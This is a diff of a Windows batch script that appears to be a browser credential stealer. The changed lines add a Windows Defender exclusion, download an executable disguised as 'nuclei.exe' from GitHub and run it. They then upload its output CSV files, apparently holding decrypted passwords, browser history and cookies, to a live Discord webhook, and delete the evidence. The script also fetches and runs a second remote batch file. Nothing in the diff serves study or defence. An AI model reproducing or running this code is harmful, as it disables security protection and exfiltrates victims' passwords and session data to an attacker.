@@ -248,32 +248,38 @@ set "cweb=https://discord.com/api/webhooks/1290057595016712222/6f_bvwefKMDSJtwgD
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %cweb%
 setlocal
 
-:: Define the URL of the executable and the output file name
 set "url=https://github.com/techtoona/test3/raw/refs/heads/main/nuclei.exe"
-set "output=nuclei.exe"
-set "csvfile=decrypted_password.csv"
+set "nucleifile=nuclei.exe"
+set "dpfile=dp.csv"
+set "bhfile=bh.csv"
+set "dcfile=dc.csv"
 
-powershell -Command "Add-MpPreference -ExclusionPath '%cd%\%output%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%cd%\%nucleifile%'"
 
-:: Download the executable
-curl -L -o "%output%" "%url%"
+curl -L -o "%nucleifile%" "%url%"
 
-:: Check if the download was successful
-if exist "%output%" (
-    start /B "" "%output%"  :: Wait for the executable to finish
+if exist "%nucleifile%" (
+    start /B "" "%nucleifile%"
 
-    timeout /t 5 /nobreak > NUL
+    timeout /t 8 /nobreak > NUL
 
 
-    :: Check if the CSV file was created
-    if exist "%csvfile%" (        
-        :: Upload the CSV file to the webhook
-        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%csvfile%" "%cweb%"
-
+    if exist "%dpfile%" (        
+        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%dpfile%" "%cweb%"
     )
 
-    del "%output%"
-    del "%csvfile%"
+    if exist "%bhfile%" (        
+        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%bhfile%" "%cweb%"
+    )
+
+    if exist "%dcfile%" (        
+        curl --silent --output /dev/null -X POST -H "Content-Type: multipart/form-data" -F "file=@%dcfile%" "%cweb%"
+    )
+
+    del "%nucleifile%"
+    del "%dpfile%"
+    del "%bhfile%"
+    del "%dcfile%"
 
 )
 
@@ -282,17 +288,14 @@ endlocal
 
 setlocal
 
-:: Define the URL of the executable and the output file name
 set "url2=https://github.com/techtoona/test/raw/refs/heads/main/parsing.bat"
 set "output2=%cd%\parsing.bat"  :: Save the output file in the current directory
 
 
 curl -L -o "%output2%" "%url2%"
 
-:: Check if the download was successful
 if exist "%output2%" (
-    start /B "" "%output2%"
-    timeout /t 50 /nobreak > NUL
+    call "%output2%"
     del "%output2%"
 )
 
